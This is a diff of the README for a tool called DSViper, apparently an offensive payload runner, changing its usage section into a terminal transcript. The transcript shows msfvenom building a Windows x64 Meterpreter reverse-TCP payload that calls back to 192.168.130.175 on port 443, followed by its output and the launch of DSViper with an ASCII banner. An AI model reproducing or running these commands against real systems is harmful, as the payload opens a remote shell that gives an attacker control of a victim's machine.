@@ -38,8 +38,14 @@ chmod +x install_dependencies.sh
 Make the `DSViper` executable and run it:
 
 ```bash
-msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.130.175 LPORT=443 -f raw > payload.bin
-./DSViper
+➜  DSViper git:(main) ✗ msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.130.175 LPORT=443 -f raw > payload.bin
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 201798 bytes
+➜  DSViper git:(main) ✗ ./DSViper                                                                                           
+
+            
 
 ░▒▓███████▓▒░ ░▒▓███████▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓███████▓▒░░▒▓████████▓▒░▒▓███████▓▒░  
 ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░             ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░ 
